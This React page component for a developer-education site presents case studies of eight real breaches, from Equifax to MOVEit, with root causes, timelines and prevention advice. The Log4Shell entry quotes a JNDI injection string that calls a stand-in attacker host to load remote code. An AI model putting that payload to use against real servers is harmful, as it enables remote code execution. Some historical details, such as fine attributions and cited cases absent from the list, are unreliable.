"use client";
import { useState } from "react";

const CASES = [
  {
    id: "equifax",
    year: 2017,
    company: "Equifax",
    product: "Consumer Credit Bureau",
    severity: "critical",
    category: "Unpatched Vulnerability",
    headline: "147 million SSNs stolen via unpatched Apache Struts",
    what: "Attackers exploited CVE-2017-5638, a critical Apache Struts vulnerability publicly known for 2 months before the breach. Equifax had failed to apply the patch to their online dispute portal. The exploit required a single crafted HTTP header.",
    rootCause: "Unpatched open-source component (Apache Struts 2.3.x) — patch was available 2 months before breach but not applied due to absent vulnerability management process.",
    damage: "$1.4 billion in remediation + $700M FTC settlement + stock lost 35% value",
    records: "147 million",
    timeline: [
      { date: "Mar 7, 2017", event: "CVE-2017-5638 publicly disclosed — patch released" },
      { date: "Mar 9, 2017", event: "CISA alert issued to all organizations" },
      { date: "May 13, 2017", event: "Attackers begin exploiting Equifax's unpatched server" },
      { date: "Jul 29, 2017", event: "Equifax security team notices suspicious traffic — 76 days later" },
      { date: "Sep 7, 2017", event: "Public disclosure — 147.9M records exposed" },
      { date: "2019", event: "$700M FTC settlement + $300M consumer fund" },
    ],
    prevention: [
      "Establish SLA: Critical CVEs patched within 24-48 hours of disclosure",
      "Run continuous SCA scanning (Snyk, OWASP Dependency-Check) in CI/CD",
      "Maintain complete Software Bill of Materials (SBOM) for all dependencies",
      "Automate patch notifications and tracking via vulnerability management platform",
      "Network segmentation — limit blast radius if one service is compromised",
    ],
    lessons: [
      "A known CVE with a public patch is the most preventable breach type",
      "Vulnerability management must be treated as a critical security process, not optional",
      "Legacy systems need extra monitoring — they accumulate unpatchable debt",
      "Data minimization: 147M SSNs should never all be queryable from one endpoint",
    ],
    icon: "📊",
    color: "#ef4444",
  },
  {
    id: "facebook-ca",
    year: 2018,
    company: "Facebook / Cambridge Analytica",
    product: "Facebook Platform API",
    severity: "critical",
    category: "API Over-Permissioning",
    headline: "87 million profiles harvested via over-permissioned API",
    what: "Facebook's Graph API allowed third-party apps to collect data not just from consenting users but from all their friends — without friends' knowledge or consent. Cambridge Analytica harvested 87 million profiles for political targeting using a quiz app that 270,000 people installed.",
    rootCause: "API design flaw: friend-of-friend data accessible without explicit consent. No rate limiting on bulk data collection. No anomaly detection on large-scale harvesting. Inadequate third-party app review.",
    damage: "$5 billion FTC fine (largest ever at time), EU €1.2B GDPR fine, Congressional hearings, stock fell 20%",
    records: "87 million",
    timeline: [
      { date: "2014", event: "Cambridge Analytica begins harvesting via Facebook API" },
      { date: "2015", event: "Facebook notified of misuse — asks CA to delete data (not verified)" },
      { date: "Mar 2018", event: "The Guardian / NY Times expose the story publicly" },
      { date: "Apr 2018", event: "Zuckerberg testifies before US Congress" },
      { date: "Jul 2019", event: "FTC imposes $5B fine on Facebook" },
      { date: "May 2023", event: "EU DPC issues €1.2B GDPR fine — largest in history" },
    ],
    prevention: [
      "Apply data minimization at API design — expose only what is strictly necessary",
      "Require explicit consent for each data category (not bundled in ToS)",
      "Implement API rate limiting and anomaly detection for bulk data access",
      "Audit third-party app permissions regularly and enforce principle of least privilege",
      "Implement OAuth scopes at field level, not object level",
    ],
    lessons: [
      "API design decisions have massive downstream privacy consequences",
      "Platform trust and developer ecosystem must be balanced with user protection",
      "Regulatory action follows data misuse — privacy is a legal requirement, not optional",
      "Friend data access is a systemic design flaw, not just a policy violation",
    ],
    icon: "👤",
    color: "#3b82f6",
  },
  {
    id: "capital-one",
    year: 2019,
    company: "Capital One",
    product: "AWS-hosted banking application",
    severity: "critical",
    category: "SSRF + Misconfigured IAM",
    headline: "100M records via SSRF exploiting AWS metadata endpoint",
    what: "Paige Thompson (ex-AWS engineer) exploited an SSRF vulnerability in Capital One's web application firewall, used it to query the AWS EC2 Instance Metadata Service (IMDSv1), retrieved IAM credentials, and used those credentials to list and download 700+ S3 buckets.",
    rootCause: "Three compounding failures: (1) SSRF vulnerability in WAF config, (2) AWS IMDSv1 allowed credential retrieval with no token requirement, (3) IAM role had excessive S3 ListBuckets + GetObject permissions across all buckets.",
    damage: "$80M OCC fine, $190M class action settlement, reputational damage",
    records: "106 million customers",
    timeline: [
      { date: "Mar 22-23, 2019", event: "Attacker exploits SSRF, retrieves IMDS credentials" },
      { date: "Apr-Jul 2019", event: "Attacker downloads data from 700+ S3 buckets over months" },
      { date: "Jul 17, 2019", event: "Attacker posts data on GitHub — reported to Capital One" },
      { date: "Jul 19, 2019", event: "Capital One notifies FBI" },
      { date: "Jul 29, 2019", event: "Paige Thompson arrested" },
      { date: "Aug 2020", event: "$80M OCC fine issued" },
    ],
    prevention: [
      "Migrate to AWS IMDSv2 — requires PUT token exchange, blocking simple SSRF",
      "Implement IAM least privilege — roles should have access only to specific S3 paths",
      "Block SSRF at network level: application servers cannot reach 169.254.169.254",
      "Validate and allowlist URLs in any server-side fetch functionality",
      "Enable AWS GuardDuty and CloudTrail alerting on unusual IAM activity",
    ],
    lessons: [
      "Cloud IAM permissions are security controls — treat them with the same rigor as firewall rules",
      "Defense in depth: SSRF + IMDSv1 + excessive IAM = catastrophic. Any one fix prevents the breach",
      "Enable IMDSv2 on all EC2 instances — it was available and free, just not enforced",
      "CloudTrail anomaly detection would have caught months of unauthorized S3 access earlier",
    ],
    icon: "🏦",
    color: "#8b5cf6",
  },
  {
    id: "solarwinds",
    year: 2020,
    company: "SolarWinds",
    product: "Orion IT Monitoring Platform",
    severity: "critical",
    category: "Supply Chain Attack",
    headline: "Nation-state backdoor injected into build pipeline, 18,000 orgs compromised",
    what: "Russian SVR intelligence (Cozy Bear/APT29) compromised SolarWinds' build pipeline and injected the SUNBURST backdoor into signed Orion software updates. The backdoor communicated with C2 servers for weeks before activating, evading detection. 18,000+ organizations installed the trojanized update, including US Treasury, DoD, and DHS.",
    rootCause: "Insecure software build and release pipeline: no integrity verification of build outputs, weak CI/CD security, compromised developer credentials, no code signing verification on final artifact.",
    damage: "18,000+ customer orgs, US government agencies breached, estimated $100M+ in incident response costs industrywide",
    records: "18,000+ organizations, classified US government data",
    timeline: [
      { date: "Oct 2019", event: "Attackers first gain access to SolarWinds network" },
      { date: "Feb 2020", event: "SUNBURST backdoor injected into Orion build process" },
      { date: "Mar 2020", event: "Trojanized Orion 2020.2 update released to customers" },
      { date: "Dec 8, 2020", event: "FireEye discovers the attack while investigating their own breach" },
      { date: "Dec 13, 2020", event: "SolarWinds, Microsoft, US Gov announce coordinated disclosure" },
      { date: "Dec 2020 - 2021", event: "Scope of US government compromise uncovered" },
    ],
    prevention: [
      "Implement reproducible builds and compare build outputs against expected hashes",
      "Use code signing for all build artifacts and verify signatures at deployment",
      "Apply Sigstore/Cosign for artifact provenance and supply chain transparency",
      "Harden CI/CD with least-privilege service accounts and MFA on all pipeline access",
      "Generate and monitor SBOM for all software components and dependencies",
      "Implement network monitoring within build environment for unexpected egress",
    ],
    lessons: [
      "The build pipeline is part of your attack surface — treat it as a production system",
      "Supply chain attacks bypass all traditional endpoint and network security",
      "Code signing does not prevent compromise if the signing key is used by a compromised builder",
      "Insider threat model must include supply chain — attackers can insert backdoors pre-shipping",
    ],
    icon: "☀️",
    color: "#f59e0b",
  },
  {
    id: "log4shell",
    year: 2021,
    company: "Apache / Global",
    product: "Log4j 2 Library",
    severity: "critical",
    category: "Dependency RCE",
    headline: "CVSS 10.0 — JNDI injection in Log4j used in virtually every Java app",
    what: "Log4j 2 evaluated JNDI lookup expressions embedded in logged strings. Attackers could cause any application that logged user-controlled input to make LDAP/RMI requests to attacker-controlled servers, loading and executing arbitrary Java classes. A single malicious string `${jndi:ldap://evil.com/a}` in a User-Agent header was enough for RCE.",
    rootCause: "Unsafe feature: Log4j evaluated expressions in logged strings by default. The feature (message lookup) was documented but its security implications were catastrophic. Applications logged unvalidated user input containing the exploit string.",
    damage: "CVSS 10.0 — millions of servers worldwide, critical infrastructure, cloud providers. Microsoft, Apple, Amazon, Cisco, VMware all affected. Estimated 1.8 billion exposure events in first 72 hours.",
    records: "Millions of servers — nation-states and cybercriminals used it within hours",
    timeline: [
      { date: "Nov 24, 2021", event: "Alibaba Cloud researcher reports to Apache" },
      { date: "Dec 9, 2021", event: "Public disclosure + PoC published on Twitter — 0-day at disclosure" },
      { date: "Dec 9-10, 2021", event: "Mass exploitation begins within hours of disclosure" },
      { date: "Dec 10, 2021", event: "Apache releases Log4j 2.15.0 (incomplete fix)" },
      { date: "Dec 13-18, 2021", event: "Three more CVEs discovered — 2.17.0 eventually safe" },
      { date: "2022", event: "CISA mandates all federal agencies patch within days" },
    ],
    prevention: [
      "Run automated SCA scanning (Snyk, Dependabot) on all Java dependencies — detect Log4j 2.x",
      "Set log4j2.formatMsgNoLookups=true as environment variable (mitigation pre-patch)",
      "Never log unvalidated user input without sanitization",
      "Implement egress filtering — application servers should not make outbound LDAP/RMI calls",
      "Maintain SBOM so you know immediately when a transitive dependency is vulnerable",
    ],
    lessons: [
      "Transitive dependencies are your risk too — know what's in your supply chain",
      "A widely-used library with a CVSS 10.0 can compromise all of software in 24 hours",
      "'Useful' logging features (expression evaluation) can be catastrophically unsafe",
      "SBOM would have let organizations identify exposure within hours instead of weeks",
    ],
    icon: "🔥",
    color: "#ef4444",
  },
  {
    id: "uber",
    year: 2022,
    company: "Uber",
    product: "Internal Infrastructure",
    severity: "critical",
    category: "Social Engineering + MFA Fatigue",
    headline: "Attacker social-engineered MFA bypass, accessed all internal systems",
    what: "An 18-year-old attacker purchased Uber employee credentials on the dark web, then MFA-bombed the employee with repeated push notifications until they approved out of fatigue. The attacker then found hardcoded admin credentials in a PowerShell script on an internal share, gaining access to all Uber internal systems including AWS, GCP, Slack, and HackerOne.",
    rootCause: "MFA fatigue attack succeeded (no number-matching/push limit). Hardcoded admin credentials in script. Excessive internal access with single credential. No anomaly detection on new device/location login.",
    damage: "All internal systems accessed, HackerOne bug reports exposed (vulnerabilities in Uber systems), major reputational damage, CISO and senior staff changes",
    records: "All internal Uber systems, confidential HackerOne vulnerability reports",
    timeline: [
      { date: "Sep 15, 2022", event: "Attacker purchases credentials, begins MFA bombing" },
      { date: "Sep 15, 2022", event: "Employee approves MFA push — attacker gains initial access" },
      { date: "Sep 15, 2022", event: "PowerShell script found with hardcoded PAM admin credentials" },
      { date: "Sep 15, 2022", event: "Attacker posts on Slack 'I am a hacker' — employees think it's a joke" },
      { date: "Sep 16, 2022", event: "Uber confirms breach, takes systems offline" },
      { date: "Sep 19, 2022", event: "Attacker confirmed as 18-year-old UK national, later arrested" },
    ],
    prevention: [
      "Use phishing-resistant MFA (FIDO2/WebAuthn hardware keys, not push notifications)",
      "Implement MFA push limits — lock account after 3 unapproved pushes in 1 hour",
      "Enable number-matching and additional context in MFA push apps (Microsoft Authenticator)",
      "Scan all internal repos and scripts for hardcoded credentials (GitLeaks, TruffleHog)",
      "Implement privileged access management (PAM) — admin credentials from Vault, not scripts",
      "Zero Trust: device posture check + impossible travel detection before granting access",
    ],
    lessons: [
      "MFA fatigue is a real, effective attack — push-based MFA is insufficient for critical accounts",
      "One compromised credential + one script = keys to the entire kingdom (over-privilege)",
      "Post-breach: hardcoded credentials in ANY internal location are a critical risk",
      "Employees need security awareness training specifically about social engineering patterns",
    ],
    icon: "🚗",
    color: "#06b6d4",
  },
  {
    id: "lastpass",
    year: 2022,
    company: "LastPass",
    product: "Password Manager",
    severity: "critical",
    category: "Developer Workstation Compromise",
    headline: "Developer's home PC compromised, vault backups stolen, master passwords at risk",
    what: "Attackers compromised a senior DevOps engineer's home computer via a vulnerable third-party media software package. They used the engineer's credentials to access LastPass cloud backups. Encrypted customer password vaults were exfiltrated. Attackers are believed to be actively attempting to crack master passwords of high-value accounts.",
    rootCause: "Vulnerable personal software on developer machine (Plex media server CVE). Developer had production secrets accessible from personal, not corporate-managed device. Insufficient isolation between personal devices and production credentials.",
    damage: "Encrypted vaults of all customers stolen. High-value targets actively targeted for vault decryption. Major trust crisis for a security product. Multiple downstream crypto theft incidents linked to LastPass vault decryption.",
    records: "All LastPass customer password vaults",
    timeline: [
      { date: "Aug 2022", event: "Initial cloud environment breach (thought to be contained)" },
      { date: "Oct 2022", event: "Attacker uses data from Aug breach to target DevOps engineer" },
      { date: "Nov 2022", event: "Engineer's home PC compromised via Plex vulnerability" },
      { date: "Dec 22, 2022", event: "LastPass discloses encrypted vaults were stolen" },
      { date: "2023", event: "Researchers link $35M+ crypto thefts to LastPass vault decryption" },
    ],
    prevention: [
      "Never allow production access from unmanaged personal devices",
      "Implement zero-trust device posture verification before granting cloud access",
      "Use hardware security keys (YubiKey) for all production system access",
      "Rotate credentials after any security incident, even 'contained' ones",
      "Encrypt backups with separate key material not accessible from primary credentials",
      "Keep all software on developer machines patched — personal software is an attack vector",
    ],
    lessons: [
      "The developer is part of the attack surface — their home machine is your security boundary",
      "A 'minor' initial breach can be the foothold for a catastrophic second-stage attack",
      "Password managers must apply security principles even more rigorously than average apps",
      "Incident response must be comprehensive — the 'contained' breach rarely is",
    ],
    icon: "🔑",
    color: "#8b5cf6",
  },
  {
    id: "moveit",
    year: 2023,
    company: "Progress Software / MOVEit Transfer",
    product: "Managed File Transfer Software",
    severity: "critical",
    category: "SQL Injection Zero-Day",
    headline: "SQL injection CVE-2023-34362 exploited by Cl0p — 2,500+ organizations, 600M+ records",
    what: "The Cl0p ransomware gang exploited a zero-day SQL injection vulnerability in MOVEit Transfer, a widely-used enterprise file transfer application. The vulnerability allowed unauthenticated attackers to extract credentials and data. The attack was notable for the massive scale — 2,500+ organizations affected including British Airways, BBC, Shell, US federal agencies, and universities.",
    rootCause: "SQL injection vulnerability in a publicly-exposed enterprise file transfer application. No WAF protection on SQL query parameters. Missing input validation on file transfer endpoints. Zero-day with no patch available at time of exploitation.",
    damage: "$9.9B estimated total economic impact, largest single-exploit campaign in history. 600M+ individuals affected. BA, BBC, Boots, Shell, US DoE, multiple governments.",
    records: "600 million+ individuals across 2,500+ organizations",
    timeline: [
      { date: "May 27, 2023", event: "Cl0p begins mass exploitation of MOVEit Transfer zero-day" },
      { date: "May 31, 2023", event: "Progress Software discovers vulnerability, issues emergency patch" },
      { date: "Jun 6, 2023", event: "Cl0p publicly claims responsibility and begins extortion" },
      { date: "Jun-Jul 2023", event: "Cascade of victim disclosures — British Airways, BBC, Shell, US Gov" },
      { date: "2023-2024", event: "2,500+ organizations confirmed affected, multiple class actions" },
    ],
    prevention: [
      "Apply security patches to internet-facing applications within hours, not days",
      "Disable public internet access to file transfer systems — VPN-only access",
      "Deploy WAF with SQL injection ruleset on all public-facing applications",
      "Implement database activity monitoring — alert on unusual bulk queries",
      "Conduct regular penetration testing on all internet-facing applications",
      "Use network segmentation to limit what MOVEit/file transfer systems can access",
    ],
    lessons: [
      "Zero-days on widely-deployed enterprise software have catastrophic scale",
      "Internet-facing file transfer systems are a high-value, high-risk attack surface",
      "Supply chain of enterprise software compounds a single vulnerability across thousands of orgs",
      "Rapid patch deployment is non-negotiable for known-vulnerable internet-facing systems",
    ],
    icon: "📁",
    color: "#f59e0b",
  },
];

const YEAR_FILTERS = ["All", "2017", "2018", "2019", "2020", "2021", "2022", "2023"];
const CATEGORY_FILTERS = ["All", ...Array.from(new Set(CASES.map((c) => c.category)))];

const RECURRING_FAILURES = [
  { issue: "Unpatched/Outdated Dependencies", count: 3, icon: "📦", cases: ["Equifax", "Log4Shell", "LastPass"], color: "var(--danger)" },
  { issue: "Excessive Permissions / Over-Privilege", count: 3, icon: "🔑", cases: ["Capital One", "Facebook API", "Uber"], color: "var(--warning)" },
  { issue: "Missing or Bypassable MFA", count: 2, icon: "🔐", cases: ["Colonial Pipeline", "Uber"], color: "var(--primary)" },
  { issue: "Hard-coded / Leaked Credentials", count: 3, icon: "🗝️", cases: ["Uber", "Toyota", "Uber 2016"], color: "var(--secondary)" },
  { issue: "No Input Validation (SQL Injection)", count: 2, icon: "💉", cases: ["MOVEit", "Equifax-era exploits"], color: "var(--danger)" },
  { issue: "Insecure Build / Supply Chain", count: 2, icon: "🔗", cases: ["SolarWinds", "event-stream"], color: "var(--accent)" },
];

type TabKey = "overview" | "rootcause" | "timeline" | "prevention" | "lessons";

function CaseCard({ c }: { c: typeof CASES[0] }) {
  const [open, setOpen] = useState(false);
  const [tab, setTab] = useState<TabKey>("overview");

  return (
    <div className="card anim-fadeup" style={{ marginBottom: "0.75rem", borderLeft: `4px solid ${c.color}` }}>
      <div onClick={() => setOpen((p) => !p)} style={{ cursor: "pointer", userSelect: "none" }}>
        <div style={{ display: "flex", alignItems: "flex-start", gap: 12 }}>
          <div style={{ width: 52, height: 52, borderRadius: 12, background: c.color + "22", border: `2px solid ${c.color}`, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
            <span style={{ fontSize: "1.4rem" }}>{c.icon}</span>
          </div>
          <div style={{ flex: 1, minWidth: 0 }}>
            <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginBottom: 5 }}>
              <span style={{ fontSize: "0.7rem", fontWeight: 800, padding: "2px 8px", borderRadius: 6, background: c.color + "22", color: c.color }}>{c.year}</span>
              <span className="badge badge-critical" style={{ fontSize: "0.65rem" }}>{c.severity}</span>
              <span style={{ fontSize: "0.7rem", padding: "2px 8px", borderRadius: 6, background: "var(--muted-bg)", color: "var(--muted)", border: "1px solid var(--card-border)" }}>{c.category}</span>
            </div>
            <div style={{ fontWeight: 700, fontSize: "1rem", marginBottom: 4 }}>{c.company}</div>
            <div style={{ fontSize: "0.85rem", color: "var(--muted)", lineHeight: 1.5 }}>{c.headline}</div>
            <div style={{ marginTop: 6, display: "flex", gap: 12, flexWrap: "wrap" }}>
              <span style={{ fontSize: "0.75rem", color: "var(--danger)", fontWeight: 600 }}>📊 {c.records} records</span>
              <span style={{ fontSize: "0.75rem", color: "var(--warning)" }}>💰 {c.damage.split(",")[0]}</span>
            </div>
          </div>
          <span style={{ color: "var(--muted)", fontSize: "1.1rem", transition: "transform 0.2s", transform: open ? "rotate(180deg)" : "none", flexShrink: 0 }}>▾</span>
        </div>
      </div>

      {open && (
        <div style={{ marginTop: "1.25rem", borderTop: "1px solid var(--card-border)", paddingTop: "1.25rem" }}>
          <div style={{ display: "flex", gap: 2, marginBottom: "1.25rem", overflowX: "auto", paddingBottom: 2 }}>
            {(["overview", "rootcause", "timeline", "prevention", "lessons"] as TabKey[]).map((t) => (
              <button key={t} onClick={() => setTab(t)}
                style={{ padding: "7px 14px", borderRadius: 7, border: "1px solid", whiteSpace: "nowrap", borderColor: tab === t ? c.color : "var(--card-border)", background: tab === t ? c.color + "22" : "transparent", color: tab === t ? c.color : "var(--muted)", cursor: "pointer", fontWeight: tab === t ? 700 : 400, fontSize: "0.78rem", transition: "all 0.2s" }}>
                {t === "overview" ? "📋 Overview" : t === "rootcause" ? "🔍 Root Cause" : t === "timeline" ? "📅 Timeline" : t === "prevention" ? "🛡️ Prevention" : "📖 Lessons"}
              </button>
            ))}
          </div>

          {tab === "overview" && (
            <div>
              <p style={{ fontSize: "0.875rem", lineHeight: 1.75, marginBottom: "1rem" }}>{c.what}</p>
              <div style={{ padding: "14px 16px", borderRadius: 10, background: "rgba(239,68,68,0.07)", border: "1px solid rgba(239,68,68,0.18)", marginBottom: "0.75rem" }}>
                <div style={{ fontSize: "0.75rem", fontWeight: 700, color: "var(--danger)", marginBottom: 6 }}>💥 Total Damage</div>
                <div style={{ fontSize: "0.875rem" }}>{c.damage}</div>
              </div>
              <div style={{ fontSize: "0.75rem", color: "var(--muted)", padding: "10px 14px", borderRadius: 8, background: "var(--muted-bg)", border: "1px solid var(--card-border)" }}>
                <strong>Product:</strong> {c.product}
              </div>
            </div>
          )}

          {tab === "rootcause" && (
            <div>
              <div style={{ padding: "16px", borderRadius: 10, background: "rgba(245,158,11,0.08)", border: "1px solid rgba(245,158,11,0.2)", marginBottom: "1rem" }}>
                <div style={{ fontSize: "0.75rem", fontWeight: 700, color: "var(--warning)", marginBottom: 8 }}>⚠️ Technical Root Cause</div>
                <p style={{ fontSize: "0.875rem", lineHeight: 1.7 }}>{c.rootCause}</p>
              </div>
              <div style={{ padding: "12px 16px", borderRadius: 8, background: "var(--muted-bg)", border: "1px solid var(--card-border)" }}>
                <div style={{ fontSize: "0.75rem", fontWeight: 700, color: "var(--primary)", marginBottom: 4 }}>Category</div>
                <span style={{ fontSize: "0.85rem", padding: "4px 12px", borderRadius: 8, background: c.color + "22", color: c.color, fontWeight: 600 }}>{c.category}</span>
              </div>
            </div>
          )}

          {tab === "timeline" && (
            <div style={{ display: "flex", flexDirection: "column", gap: 0 }}>
              {c.timeline.map((item, i) => (
                <div key={i} style={{ display: "flex", gap: 12 }}>
                  <div style={{ display: "flex", flexDirection: "column", alignItems: "center", flexShrink: 0 }}>
                    <div style={{ width: 14, height: 14, borderRadius: "50%", background: c.color, flexShrink: 0, marginTop: 4 }} />
                    {i < c.timeline.length - 1 && <div style={{ width: 2, flex: 1, minHeight: 20, background: c.color + "44", margin: "4px 0" }} />}
                  </div>
                  <div style={{ paddingBottom: 16 }}>
                    <div style={{ fontSize: "0.72rem", fontWeight: 700, color: c.color, marginBottom: 3 }}>{item.date}</div>
                    <div style={{ fontSize: "0.85rem", lineHeight: 1.5 }}>{item.event}</div>
                  </div>
                </div>
              ))}
            </div>
          )}

          {tab === "prevention" && (
            <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
              <div style={{ fontSize: "0.8rem", color: "var(--muted)", marginBottom: 4 }}>These controls would have prevented or significantly limited the breach:</div>
              {c.prevention.map((p, i) => (
                <div key={i} style={{ display: "flex", gap: 12, padding: "12px 14px", borderRadius: 8, background: "rgba(16,185,129,0.07)", border: "1px solid rgba(16,185,129,0.18)" }}>
                  <span style={{ color: "var(--success)", fontWeight: 700, flexShrink: 0, fontSize: "1rem" }}>✓</span>
                  <span style={{ fontSize: "0.875rem", lineHeight: 1.6 }}>{p}</span>
                </div>
              ))}
            </div>
          )}

          {tab === "lessons" && (
            <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
              {c.lessons.map((l, i) => (
                <div key={i} style={{ display: "flex", gap: 12, padding: "12px 14px", borderRadius: 8, background: "rgba(99,102,241,0.08)", border: "1px solid rgba(99,102,241,0.18)" }}>
                  <span style={{ color: "var(--secondary)", flexShrink: 0, fontSize: "1.1rem" }}>💡</span>
                  <span style={{ fontSize: "0.875rem", lineHeight: 1.6 }}>{l}</span>
                </div>
              ))}
            </div>
          )}
        </div>
      )}
    </div>
  );
}

export default function CaseStudiesPage() {
  const [yearFilter, setYearFilter] = useState("All");
  const [catFilter, setCatFilter] = useState("All");
  const [search, setSearch] = useState("");

  const filtered = CASES.filter((c) => {
    const yearOk = yearFilter === "All" || String(c.year) === yearFilter;
    const catOk = catFilter === "All" || c.category === catFilter;
    const q = search.toLowerCase();
    const sOk = !q || c.company.toLowerCase().includes(q) || c.headline.toLowerCase().includes(q) || c.category.toLowerCase().includes(q);
    return yearOk && catOk && sOk;
  });

  const totalRecords = "1.2B+";
  const totalFines = "$8B+";

  return (
    <div style={{ maxWidth: 1000, margin: "0 auto" }}>
      <div className="anim-fadeup" style={{ marginBottom: "1.5rem" }}>
        <h1 style={{ fontSize: "1.75rem", fontWeight: 800, marginBottom: "0.5rem" }}>
          <span className="gradient-text">Security Failure Case Studies</span>
        </h1>
        <p style={{ color: "var(--muted)", maxWidth: 680 }}>
          Real-world breaches caused by negligence in security practices. Each case study includes root cause analysis, attack timeline, preventable controls, and lessons learned for developers.
        </p>
      </div>

      {/* Stats banner */}
      <div className="grid-3 anim-fadeup delay-1" style={{ marginBottom: "1.5rem" }}>
        {[
          { label: "Case Studies", value: CASES.length, icon: "📋", color: "var(--primary)" },
          { label: "Records Exposed", value: totalRecords, icon: "📊", color: "var(--danger)" },
          { label: "Total Fines", value: totalFines, icon: "💰", color: "var(--warning)" },
        ].map((s) => (
          <div key={s.label} className="card" style={{ textAlign: "center", borderTop: `3px solid ${s.color}` }}>
            <div style={{ fontSize: "1.5rem", marginBottom: 4 }}>{s.icon}</div>
            <div style={{ fontSize: "1.75rem", fontWeight: 900, color: s.color }}>{s.value}</div>
            <div style={{ fontSize: "0.8rem", color: "var(--muted)" }}>{s.label}</div>
          </div>
        ))}
      </div>

      {/* Filters */}
      <div style={{ display: "flex", gap: 4, overflowX: "auto", marginBottom: "0.75rem", paddingBottom: 2 }}>
        {YEAR_FILTERS.map((y) => (
          <button key={y} onClick={() => setYearFilter(y)}
            style={{ padding: "6px 14px", borderRadius: 99, border: "1px solid", whiteSpace: "nowrap", borderColor: yearFilter === y ? "var(--primary)" : "var(--card-border)", background: yearFilter === y ? "var(--primary-glow)" : "transparent", color: yearFilter === y ? "var(--primary)" : "var(--muted)", cursor: "pointer", fontWeight: yearFilter === y ? 700 : 400, fontSize: "0.8rem", transition: "all 0.2s" }}>
            {y}
          </button>
        ))}
      </div>

      <div style={{ display: "flex", gap: 10, marginBottom: "1.5rem", flexWrap: "wrap" }}>
        <input value={search} onChange={(e) => setSearch(e.target.value)} placeholder="🔍 Search company, category, attack type…"
          style={{ flex: 1, minWidth: 200, padding: "9px 14px", borderRadius: 8, border: "1px solid var(--card-border)", background: "var(--card)", color: "var(--fg)", fontSize: "0.875rem", outline: "none" }} />
        <select value={catFilter} onChange={(e) => setCatFilter(e.target.value)}
          style={{ padding: "8px 12px", borderRadius: 8, border: "1px solid var(--card-border)", background: "var(--card)", color: "var(--fg)", fontSize: "0.82rem", cursor: "pointer" }}>
          {CATEGORY_FILTERS.map((c) => <option key={c} value={c}>{c}</option>)}
        </select>
      </div>

      <div style={{ fontSize: "0.8rem", color: "var(--muted)", marginBottom: "1rem" }}>
        {filtered.length} cases • Click any case to explore root cause, timeline, and prevention
      </div>

      {filtered.map((c) => <CaseCard key={c.id} c={c} />)}

      {/* Recurring Failures */}
      <section style={{ marginTop: "2.5rem" }}>
        <h2 style={{ fontSize: "1.1rem", fontWeight: 700, marginBottom: "0.5rem" }}>📊 Recurring Failure Patterns</h2>
        <p style={{ fontSize: "0.85rem", color: "var(--muted)", marginBottom: "1.25rem" }}>These same root causes appear again and again across breaches. Fix these first.</p>
        <div className="grid-2">
          {RECURRING_FAILURES.map((f) => (
            <div key={f.issue} className="card" style={{ borderLeft: `3px solid ${f.color}`, display: "flex", gap: 14, alignItems: "flex-start" }}>
              <span style={{ fontSize: "1.75rem", flexShrink: 0 }}>{f.icon}</span>
              <div>
                <div style={{ fontWeight: 700, fontSize: "0.9rem", marginBottom: 4 }}>{f.issue}</div>
                <div style={{ fontSize: "0.75rem", color: "var(--muted)", marginBottom: 6 }}>Seen in: {f.cases.join(", ")}</div>
                <span style={{ fontSize: "0.7rem", padding: "2px 8px", borderRadius: 6, background: f.color + "22", color: f.color, fontWeight: 700 }}>{f.count} cases</span>
              </div>
            </div>
          ))}
        </div>
      </section>
    </div>
  );
}
